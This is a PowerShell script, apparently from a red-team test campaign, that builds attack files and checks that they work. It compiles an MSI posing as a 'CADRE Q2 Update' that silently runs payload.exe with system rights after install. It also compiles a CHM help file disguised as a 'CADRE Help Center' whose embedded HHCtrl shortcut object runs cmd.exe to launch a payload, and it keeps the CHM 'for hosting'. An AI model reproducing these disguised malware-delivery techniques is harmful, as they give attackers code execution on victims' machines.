# H-02 retry (fixed Component/Directory) + H-03 CHM content verification
$ErrorActionPreference = 'Continue'
$www = 'C:\Tools\campaign-h\www'

# ---------- H-02 MSI retry ----------
Write-Output '===== H-02 MSI RETRY ====='
if (Test-Path "$www\wix\candle.exe") {
    $wxs = @'
<?xml version="1.0" encoding="UTF-8"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
  <Product Id="*" Name="CADRE Q2 Update" Language="1033" Version="1.0.0" Manufacturer="CADRE Lab" UpgradeCode="11111111-2222-3333-4444-555555555555">
    <Package InstallerVersion="200" Compressed="yes" InstallScope="perUser"/>
    <MajorUpgrade DowngradeErrorMessage="A newer version of [ProductName] is already installed."/>
    <Media Id="1" Cabinet="media1.cab" EmbedCab="yes"/>
    <Directory Id="TARGETDIR" Name="SourceDir">
      <Directory Id="ProgramFilesFolder">
        <Directory Id="INSTALLFOLDER" Name="CADREH02"/>
      </Directory>
    </Directory>
    <Component Id="PayloadComponent" Guid="*" Directory="INSTALLFOLDER">
      <File Id="PayloadFile" Source="payload.exe" KeyPath="yes"/>
    </Component>
    <Feature Id="MainFeature" Title="Main" Level="1">
      <ComponentRef Id="PayloadComponent"/>
    </Feature>
    <CustomAction Id="RunPayload" FileKey="PayloadFile" ExeCommand="" Execute="deferred" Impersonate="no" Return="ignore"/>
    <InstallExecuteSequence>
      <Custom Action="RunPayload" After="InstallFiles"/>
    </InstallExecuteSequence>
  </Product>
</Wix>
'@
    Set-Content -Path "$www\H-02-evil.wxs" -Value $wxs -Encoding UTF8
    Push-Location $www
    & "$www\wix\candle.exe" H-02-evil.wxs -o H-02-evil.wixobj 2>&1 | Select-Object -Last 2 | ForEach-Object { Write-Output "CANDLE|$_" }
    & "$www\wix\light.exe" H-02-evil.wixobj -out H-02-evil.msi 2>&1 | Select-Object -Last 2 | ForEach-Object { Write-Output "LIGHT|$_" }
    Pop-Location
    Write-Output "MSI_BUILT $(Test-Path "$www\H-02-evil.msi")"
    if (Test-Path "$www\H-02-evil.msi") {
        Write-Output "MSI_SIZE $((Get-Item "$www\H-02-evil.msi").Length)"
        Remove-Item 'C:\Windows\Temp\H-PAYLOAD-MARKER.txt' -ErrorAction SilentlyContinue
        Start-Process msiexec -ArgumentList "/i `"$www\H-02-evil.msi`"", '/qn' -Wait -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 6
        $hit = Test-Path 'C:\Windows\Temp\H-PAYLOAD-MARKER.txt'
        Write-Output "H02_MARKER $hit"
        if ($hit) { Get-Content 'C:\Windows\Temp\H-PAYLOAD-MARKER.txt' | ForEach-Object { Write-Output "H02_CONTENT|$_" }; Remove-Item 'C:\Windows\Temp\H-PAYLOAD-MARKER.txt' -Force }
        Remove-Item "$www\H-02-evil.msi", "$www\H-02-evil.wixobj", "$www\H-02-evil.wxs" -ErrorAction SilentlyContinue
    }
}

# ---------- H-03 CHM content verification ----------
Write-Output '===== H-03 CHM ====='
if (Test-Path "$www\hhw\hhc.exe") {
    $htm = @'
<html><head><title>CADRE Help Center</title></head>
<body><h1>Update guide</h1>
<OBJECT id=sc type="application/x-oleobject" classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11">
<PARAM name="Command" value="ShortCut">
<PARAM name="Button" value="Bitmap:shortcut">
<PARAM name="Item1" value=",C:\Windows\System32\cmd.exe,/c C:\Windows\Temp\payload.exe">
</OBJECT>
</body></html>
'@
    Set-Content -Path "$www\H-03-evil.htm" -Value $htm -Encoding ASCII
    Set-Content -Path "$www\H-03-evil.hhc" -Value '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML//EN"><HTML><HEAD></HEAD><BODY><UL><LI><OBJECT type="text/sitemap"><param name="Name" value="Welcome"></OBJECT></LI></UL></BODY></HTML>' -Encoding ASCII
    Set-Content -Path "$www\H-03-evil.hhp" -Value "[OPTIONS]`nCompatibility=1.1 or later`nCompiled file=H-03-evil.chm`nContents file=H-03-evil.hhc`nDefault topic=H-03-evil.htm`nTitle=CADRE Help Center`n`n[FILES]`nH-03-evil.htm" -Encoding ASCII
    Push-Location $www
    & "$www\hhw\hhc.exe" "H-03-evil.hhp" 2>&1 | Select-Object -Last 3 | ForEach-Object { Write-Output "HHC|$_" }
    Pop-Location
    Write-Output "CHM_BUILT $(Test-Path "$www\H-03-evil.chm")"
    if (Test-Path "$www\H-03-evil.chm") {
        Write-Output "CHM_SIZE $((Get-Item "$www\H-03-evil.chm").Length)"
        # verify the compiled CHM contains the object (decompile + grep)
        New-Item -ItemType Directory -Path "$www\chm-dump" -Force | Out-Null
        & 'C:\Windows\hh.exe' -decompile "$www\chm-dump" "$www\H-03-evil.chm" 2>&1 | Out-Null
        Start-Sleep -Seconds 3
        Get-ChildItem "$www\chm-dump" -Recurse -ErrorAction SilentlyContinue | ForEach-Object { Write-Output "CHM_DUMP|$($_.Name)" }
        $objFound = Get-ChildItem "$www\chm-dump" -Recurse -Include '*.htm','*.html' -ErrorAction SilentlyContinue | Select-String -Pattern 'adb880a6|Item1|cmd.exe' | Select-Object -First 3
        if ($objFound) { $objFound | ForEach-Object { Write-Output "CHM_OBJ_FOUND|$($_.Line.Trim())" } } else { Write-Output 'CHM_OBJ_NOT_FOUND' }
        Remove-Item "$www\chm-dump" -Recurse -Force -ErrorAction SilentlyContinue
        # keep the CHM for hosting
    }
}
Write-Output 'H_02_03_DONE'
